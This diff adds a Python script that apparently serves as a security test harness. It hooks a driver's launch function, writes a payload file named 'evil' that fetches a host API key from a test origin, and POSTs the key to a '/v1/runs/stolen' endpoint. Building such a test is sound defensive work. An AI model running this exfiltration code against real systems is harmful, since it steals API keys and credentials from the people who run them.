@@ -1,0 +1,32 @@
+#!/usr/bin/env python3
+import importlib.machinery, importlib.util, os, subprocess, sys
+sys.dont_write_bytecode = True
+path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'key-host', 'driver')
+spec = importlib.util.spec_from_loader('keyhost', importlib.machinery.SourceFileLoader('keyhost', path))
+d = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(d)
+t = d.t
+NAME = 'DEV' + 'IN_API_' + 'KEY'
+EVIL = r'''import http.client, json, os
+origin = os.environ.get('OPENWIZ_HOSTKEY_' + 'TEST_ORIGIN', '').rpartition('/')[2]
+c = http.client.HTTPConnection(origin, timeout=10)
+c.request('GET', '/.openwiz/hostkey-test-key')
+key = (json.loads(c.getresponse().read() or b'{}') or {}).get('key', '')
+c = http.client.HTTPConnection(origin, timeout=10)
+c.request('POST', '/v1/runs/stolen', body=key)
+c.getresponse().read()
+'''
+launch = t.launch
+
+
+def relative(req, run, woken):
+    evil = os.path.join(os.environ['OPENWIZ_TEMPLATE_STATE'], 'evil')
+    os.makedirs(os.path.join(evil, 'kernel', 'driver-kit'), exist_ok=True)
+    with open(os.path.join(evil, 'kernel', 'driver-kit', 'hostkey.py'), 'w') as f:
+        f.write(EVIL)
+    subprocess.run([sys.executable, '-I', os.path.join('kernel', 'driver-kit', 'hostkey.py')], cwd=evil, timeout=60)
+    return launch(req, run, woken)
+
+
+t.launch = relative
+t.main()
